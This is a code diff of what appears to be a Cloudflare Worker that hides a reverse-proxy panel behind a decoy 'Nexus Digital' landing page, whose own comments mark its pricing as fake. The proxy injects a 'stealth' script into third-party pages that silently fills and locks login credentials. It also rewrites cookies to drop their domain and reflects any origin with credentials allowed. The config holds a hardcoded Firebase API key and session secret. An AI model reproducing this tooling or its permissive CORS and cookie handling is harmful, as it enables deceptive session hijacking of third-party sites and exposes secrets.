@@ -5,11 +5,12 @@ const CONFIG = {
     SESSION_SECRET: "nexus_enterprise_secure_tunnel_2026",
     FB_URL: "https://private-panel-916b4-default-rtdb.firebaseio.com",
     FB_KEY: "AIzaSyC5Ygv7umkM3LJ9XEDJUTcrn_DmJ19eY0c",
-    DB_NODE: "admin_web"
+    DB_NODE: "admin_web",
+    FAVICON: "https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg"
 };
 
 // ==========================================
-// 🔐 ADVANCED CRYPTO ENGINE (Unicode Safe)
+// 🔐 ADVANCED CRYPTO ENGINE
 // ==========================================
 const encrypt = (text) => {
     let res = '';
@@ -26,6 +27,8 @@ const decrypt = (b64) => {
     } catch(e) { return null; }
 };
 
+const headInject = `<link rel="icon" type="image/jpeg" href="${CONFIG.FAVICON}">`;
+
 // ==========================================
 // 🎨 UI: MASSIVE REALISTIC DECOY LANDING PAGE
 // ==========================================
@@ -36,6 +39,7 @@ const landingPageHTML = `
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nexus Digital | Enterprise Solutions</title>
+    ${headInject}
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #050505; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; scroll-behavior: smooth;}
@@ -63,7 +67,6 @@ const landingPageHTML = `
         </div>
     </nav>
 
-    <!-- Hero Section -->
     <header class="relative pt-32 pb-20 md:pt-48 md:pb-24 px-4 flex flex-col items-center justify-center border-b border-white/5">
         <div class="absolute top-1/4 left-1/2 -translate-x-1/2 w-3/4 h-1/2 bg-indigo-900/10 blur-[120px] rounded-full pointer-events-none"></div>
         <div class="text-center z-10 w-full max-w-2xl mx-auto">
@@ -84,113 +87,6 @@ const landingPageHTML = `
             <p id="search-msg" class="text-[10px] font-bold text-gray-500 mt-4 tracking-widest uppercase opacity-0 transition-opacity h-4"></p>
         </div>
     </header>
-
-    <div class="w-full border-b border-white/5 bg-[#080808]">
-        <div class="max-w-5xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-4 py-12 px-6 text-center">
-            <div><p class="text-3xl font-bold text-white mb-1">99.99%</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Uptime SLA</p></div>
-            <div><p class="text-3xl font-bold text-white mb-1">200+</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Edge Datacenters</p></div>
-            <div><p class="text-3xl font-bold text-white mb-1">&lt;12ms</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Global Latency</p></div>
-            <div><p class="text-3xl font-bold text-white mb-1">AES-GCM</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">256-bit Encrypted</p></div>
-        </div>
-    </div>
-
-    <!-- Services -->
-    <section id="services" class="py-24 px-6 max-w-7xl mx-auto">
-        <h2 class="text-3xl font-bold mb-4 text-center tracking-wide">Infrastructure <span class="text-indigo-400 font-light">Solutions</span></h2>
-        <p class="text-gray-500 text-sm text-center mb-16 max-w-2xl mx-auto leading-relaxed">We provide military-grade proxy routing and content delivery networks for high-traffic enterprise applications.</p>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-            <div class="feature-box p-8">
-                <div class="w-12 h-12 bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center mb-6"><svg class="w-6 h-6 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8V7z"></path></svg></div>
-                <h3 class="text-lg font-bold mb-3 text-white">Zero-Trust Vaults</h3>
-                <p class="text-xs text-gray-400 leading-relaxed">Our end-to-end encrypted architecture ensures that no unauthorized traffic can access your enterprise data components.</p>
-            </div>
-            <div class="feature-box p-8">
-                <div class="w-12 h-12 bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center mb-6"><svg class="w-6 h-6 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div>
-                <h3 class="text-lg font-bold mb-3 text-white">Global Edge Proxy</h3>
-                <p class="text-xs text-gray-400 leading-relaxed">Traffic is intelligently routed through advanced edge networks to mask your origin IP and provide automated DDoS mitigation.</p>
-            </div>
-            <div class="feature-box p-8">
-                <div class="w-12 h-12 bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center mb-6"><svg class="w-6 h-6 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg></div>
-                <h3 class="text-lg font-bold mb-3 text-white">High Performance</h3>
-                <p class="text-xs text-gray-400 leading-relaxed">Lightning-fast content delivery deployed worldwide. Latency reduced to mere milliseconds for an uninterrupted user experience.</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- Pricing (Fake) -->
-    <section id="pricing" class="py-24 border-y border-white/5 bg-[#080808]">
-        <div class="max-w-7xl mx-auto px-6">
-            <h2 class="text-3xl font-bold mb-4 text-center tracking-wide">Transparent <span class="text-indigo-400 font-light">Pricing</span></h2>
-            <p class="text-gray-500 text-sm text-center mb-16 max-w-2xl mx-auto leading-relaxed">Scale your infrastructure without worrying about hidden fees.</p>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-5xl mx-auto">
-                <div class="feature-box p-8 flex flex-col items-center text-center">
-                    <h3 class="text-lg font-bold mb-2 uppercase tracking-widest text-gray-400">Developer</h3>
-                    <p class="text-4xl font-bold text-white mb-6">$49<span class="text-sm text-gray-500 font-normal">/mo</span></p>
-                    <ul class="text-xs text-gray-400 space-y-3 mb-8 w-full text-left">
-                        <li class="flex items-center gap-2"><svg class="w-4 h-4 text-indigo-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Up to 5 Proxy Nodes</li>
-                        <li class="flex items-center gap-2"><svg class="w-4 h-4 text-indigo-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Standard DDoS Protection</li>
-                    </ul>
-                    <button class="w-full py-3 bg-white/10 hover:bg-white/20 text-white text-[10px] font-bold uppercase tracking-widest transition mt-auto">Get Started</button>
-                </div>
-                <div class="feature-box p-8 flex flex-col items-center text-center border-indigo-500/50 relative">
-                    <div class="absolute top-0 transform -translate-y-1/2 bg-indigo-500 text-white text-[9px] font-bold uppercase tracking-widest px-3 py-1">Most Popular</div>
-                    <h3 class="text-lg font-bold mb-2 uppercase tracking-widest text-indigo-400">Enterprise</h3>
-                    <p class="text-4xl font-bold text-white mb-6">$299<span class="text-sm text-gray-500 font-normal">/mo</span></p>
-                    <ul class="text-xs text-gray-400 space-y-3 mb-8 w-full text-left">
-                        <li class="flex items-center gap-2"><svg class="w-4 h-4 text-indigo-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Unlimited Edge Nodes</li>
-                        <li class="flex items-center gap-2"><svg class="w-4 h-4 text-indigo-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> 24/7 Dedicated Support</li>
-                    </ul>
-                    <button class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 text-white text-[10px] font-bold uppercase tracking-widest transition mt-auto shadow-[0_0_15px_rgba(99,102,241,0.4)]">Contact Sales</button>
-                </div>
-                <div class="feature-box p-8 flex flex-col items-center text-center">
-                    <h3 class="text-lg font-bold mb-2 uppercase tracking-widest text-gray-400">Custom</h3>
-                    <p class="text-4xl font-bold text-white mb-6">Let's Talk</p>
-                    <ul class="text-xs text-gray-400 space-y-3 mb-8 w-full text-left">
-                        <li class="flex items-center gap-2"><svg class="w-4 h-4 text-indigo-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Custom Infrastructure Setup</li>
-                        <li class="flex items-center gap-2"><svg class="w-4 h-4 text-indigo-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> On-Premise Deployments</li>
-                    </ul>
-                    <button class="w-full py-3 bg-white/10 hover:bg-white/20 text-white text-[10px] font-bold uppercase tracking-widest transition mt-auto">Book Demo</button>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Massive Footer -->
-    <footer class="pt-20 pb-10 px-6 bg-[#030303] border-t border-white/5">
-        <div class="max-w-7xl mx-auto grid grid-cols-2 md:grid-cols-5 gap-10 mb-16">
-            <div class="col-span-2 md:col-span-2">
-                <div class="text-2xl font-bold tracking-widest uppercase cursor-default select-none flex items-center gap-2 mb-4">
-                    <svg class="w-6 h-6 text-indigo-500" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
-                    Nexus<span class="text-gray-500">.</span>
-                </div>
-                <p class="text-xs text-gray-500 leading-relaxed max-w-sm">Building the foundation of the decentralized web. Secure, scalable, and resilient enterprise cloud solutions.</p>
-            </div>
-            <div>
-                <h4 class="text-white font-bold uppercase tracking-widest text-[10px] mb-4">Products</h4>
-                <ul class="space-y-3 text-xs text-gray-500">
-                    <li><a href="#" class="hover:text-white transition">Edge Proxy</a></li>
-                    <li><a href="#" class="hover:text-white transition">Data Vault</a></li>
-                </ul>
-            </div>
-            <div>
-                <h4 class="text-white font-bold uppercase tracking-widest text-[10px] mb-4">Resources</h4>
-                <ul class="space-y-3 text-xs text-gray-500">
-                    <li><a href="#" class="hover:text-white transition">Documentation</a></li>
-                    <li><a href="#" class="hover:text-white transition">API Reference</a></li>
-                </ul>
-            </div>
-            <div>
-                <h4 class="text-white font-bold uppercase tracking-widest text-[10px] mb-4">Company</h4>
-                <ul class="space-y-3 text-xs text-gray-500">
-                    <li><a href="#" class="hover:text-white transition">About Us</a></li>
-                    <li><a href="#" class="hover:text-white transition">Contact</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6 border-t border-white/10 pt-8">
-            <p class="text-[10px] text-gray-600 uppercase tracking-widest">&copy; 2026 Nexus Digital Enterprise. All rights reserved.</p>
-        </div>
-    </footer>
 
     <script>
         document.getElementById('search-form').addEventListener('submit', async (e) => {
@@ -233,6 +129,19 @@ export default {
     async fetch(request, env, ctx) {
         const url = new URL(request.url);
         const path = url.pathname;
+
+        // 🔥 GLOBAL CORS HANDLER (FIXES API LOGIN ISSUES)
+        if (request.method === "OPTIONS") {
+            return new Response(null, {
+                headers: {
+                    "Access-Control-Allow-Origin": request.headers.get("Origin") || "*",
+                    "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, PATCH, OPTIONS",
+                    "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers") || "*",
+                    "Access-Control-Allow-Credentials": "true",
+                    "Access-Control-Max-Age": "86400"
+                }
+            });
+        }
 
         const cookies = Object.fromEntries((request.headers.get("Cookie") || "").split(';').map(c => {
             const parts = c.split('='); return[parts[0].trim(), parts.slice(1).join('=')];
@@ -296,8 +205,15 @@ export default {
             const proxyRes = await fetch(targetUrlStr, fetchConfig);
             const responseHeaders = new Headers(proxyRes.headers);
             
-            responseHeaders.set("Access-Control-Allow-Origin", "*");
+            responseHeaders.set("Access-Control-Allow-Origin", request.headers.get("Origin") || "*");
             responseHeaders.set("Access-Control-Allow-Credentials", "true");
+
+            const setCookies = proxyRes.headers.get("set-cookie");
+            if (setCookies) {
+                responseHeaders.delete("set-cookie");
+                let modCookie = setCookies.replace(/Domain=[^;]+;?\s*/gi, '');
+                responseHeaders.append('Set-Cookie', modCookie);
+            }
 
             return new Response(proxyRes.body, { status: proxyRes.status, statusText: proxyRes.statusText, headers: responseHeaders });
         }
@@ -368,7 +284,7 @@ export default {
             }
 
             const adminHTML = `<!DOCTYPE html><html lang="en" class="dark">
-            <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Portal</title><script src="https://cdn.tailwindcss.com"></script>
+            <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Portal</title>${headInject}<script src="https://cdn.tailwindcss.com"></script>
             <style>
                 body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; } 
                 .square-card { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.05); } 
@@ -538,7 +454,7 @@ export default {
                                         <input value="\${db.sites[id].name}" oninput="uSiteF('\${id}','name',this.value)" placeholder="Enter Website Name..." class="w-full bg-transparent text-xl font-bold text-white border-b border-white/10 outline-none pb-1 focus:border-indigo-500">
                                     </div>
                                     <div class="space-y-3 mb-5 flex-grow">
-                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Panel/Agent Link</span>
+                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Agent Link</span>
                                         <input value="\${db.sites[id].agentLink}" oninput="uSiteF('\${id}','agentLink',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-2 text-xs text-green-400 outline-none focus:border-white/30"></div>
                                         <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">User Link</span>
                                         <input value="\${db.sites[id].userLink}" oninput="uSiteF('\${id}','userLink',this.value)" placeholder="ag.example.com" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-blue-400 outline-none focus:border-white/30"></div>
@@ -670,7 +586,7 @@ export default {
                                 
                                 <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full mt-2 relative">
                                     <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Password</span>
-                                    <input type="password" readonly value="${siteConf.p || ''}" id="pwd-disp-${siteId}" autocomplete="new-password" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate">
+                                    <input type="text" readonly value="${siteConf.p || ''}" id="pwd-disp-${siteId}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate" style="-webkit-text-security: disc; font-family: text-security-disc, sans-serif; pointer-events: none;">
                                     <div class="flex gap-1 flex-shrink-0">
                                         <button onclick="copyLink(document.getElementById('pwd-disp-${siteId}').value, this)" class="w-7 h-7 flex items-center justify-center bg-white/10 hover:bg-white/20 transition-colors">
                                             <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
@@ -679,7 +595,7 @@ export default {
                                     </div>
                                 </div>
                                 <div id="pwd-edit-${siteId}" class="hidden mt-2 flex gap-2 pt-2 border-t border-white/10">
-                                    <input type="text" id="pwd-in-${siteId}" autocomplete="new-password" placeholder="Type new password..." class="flex-grow bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-indigo-500">
+                                    <input type="text" id="pwd-in-${siteId}" placeholder="Type new password..." class="flex-grow bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-indigo-500">
                                     <button onclick="savePwd('${siteId}')" class="px-4 bg-indigo-600/20 text-indigo-400 border border-indigo-500/50 hover:bg-indigo-600 hover:text-white transition text-[9px] font-bold uppercase tracking-widest">Save</button>
                                 </div>
 
@@ -733,7 +649,9 @@ export default {
                 </div>`;
             }
 
-            const html = `<!DOCTYPE html><html lang="en" class="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Core | Portal</title><script src="https://cdn.tailwindcss.com"></script>
+            const html = `<!DOCTYPE html><html lang="en" class="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Core | Portal</title>
+            ${headInject}
+            <script src="https://cdn.tailwindcss.com"></script>
             <style>body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; }</style></head>
             <body class="pb-20">
                 ${customModalScript} ${notifHTML} ${waHTML}
@@ -888,7 +806,13 @@ export default {
             const contentType = responseHeaders.get("Content-Type") || "";
             if (contentType.includes("text/html")) {
                 let htmlText = await proxyRes.text();
-                htmlText = htmlText.split(targetDomain).join(url.origin);
+                
+                // 🔥 URL REPLACER (REGEX SAFE) 🔥 
+                // শুধুমাত্র মেইন ডোমেইন লিঙ্কগুলোকে রিপ্লেস করবে, ডাটাবেজ/JSON নষ্ট করবে না।
+                const targetUrlProtocol = tDomainObj.protocol + "//" + tDomainObj.hostname;
+                const escapedTarget = targetUrlProtocol.replace(/[-\/\\^$*+?.()|[\\]{}]/g, '\\$&');
+                const regex = new RegExp(escapedTarget, "gi");
+                htmlText = htmlText.replace(regex, url.origin);
                 
                 const encTargetTrim = encrypt(targetDomain).substring(0,8);
                 const stealthScript = `<script>
@@ -931,6 +855,7 @@ export default {
                         function setNativeValue(el, val) {
                             if (!el || el.value === val) return;
                             try {
+                                el.focus();
                                 const valueSetter = Object.getOwnPropertyDescriptor(el, 'value').set;
                                 const prototype = Object.getPrototypeOf(el);
                                 const prototypeValueSetter = Object.getOwnPropertyDescriptor(prototype, 'value').set;
@@ -938,10 +863,11 @@ export default {
                                 else valueSetter.call(el, val);
                                 el.dispatchEvent(new Event('input', { bubbles: true }));
                                 el.dispatchEvent(new Event('change', { bubbles: true }));
+                                el.blur();
                             } catch(e){}
                         }
 
-                        // 🔥 SMART PAGE ISOLATION (Only fill on Login pages and Banking Passwords)
+                        // 🔥 SMART PAGE ISOLATION FOR FREEZING
                         window.addEventListener('DOMContentLoaded', () => {
                             const au = "${autoUser}"; const ap = "${autoPwd}";
                             if(au && ap) {
@@ -951,23 +877,19 @@ export default {
 
                                 const fill = () => {
                                     const path = window.location.pathname.toLowerCase();
-                                    const isLoginPage = path === '/' || path.includes('login') || path.includes('auth') || path.includes('sign');
-                                    
                                     const pwds = document.querySelectorAll('input[type="password"], input.masked-pwd');
                                     
-                                    // Rule 1: Always freeze and fill Password IF there is exactly 1 (Works for Login & Banking)
-                                    // Prevents filling on "Add Agent" which has 3 password boxes
+                                    // Rule 1: We only auto-fill if there is exactly ONE password field on the page
                                     if (pwds.length === 1) {
                                         let pField = pwds[0];
                                         if(pField.value !== ap) setNativeValue(pField, ap);
                                         pField.setAttribute('type', 'text');
                                         pField.classList.add('frozen-input', 'masked-pwd');
                                         pField.setAttribute('readonly', 'true');
-                                        pField.setAttribute('autocomplete', 'new-password');
-                                        pField.setAttribute('data-lpignore', 'true');
                                     }
 
-                                    // Rule 2: ONLY freeze and fill Username IF on Login Page
+                                    // Rule 2: Only fill Username if we are on Login page AND there is exactly 1 pwd field
+                                    const isLoginPage = path === '/' || path.includes('login') || path.includes('auth') || path.includes('sign');
                                     if (isLoginPage && pwds.length === 1) {
                                         const txts = document.querySelectorAll('input[type="text"], input[type="email"]');
                                         for(let i=0; i<txts.length; i++) {
@@ -981,8 +903,7 @@ export default {
                                                     el.classList.add('frozen-input');
                                                     el.style.webkitTextSecurity = 'none'; // Keep visible
                                                     el.setAttribute('readonly', 'true');
-                                                    el.setAttribute('autocomplete', 'off');
-                                                    break; // Only target the first valid field
+                                                    break; // Targeted successfully
                                                 }
                                             }
                                         }
@@ -990,15 +911,15 @@ export default {
                                 };
                                 
                                 fill();
-                                setInterval(fill, 500); // Continuous check for SPA (React) apps
+                                setInterval(fill, 500); 
                             }
                         });
                     }catch(e){}
                 })();
                 </script>`;
                 
-                if (htmlText.includes("<head>")) htmlText = htmlText.replace("<head>", "<head>" + stealthScript); 
-                else htmlText = stealthScript + htmlText;
+                if (htmlText.includes("<head>")) htmlText = htmlText.replace("<head>", `<head>\n${headInject}\n${stealthScript}`); 
+                else htmlText = headInject + stealthScript + htmlText;
                 
                 body = htmlText;
                 responseHeaders.delete("Content-Length");
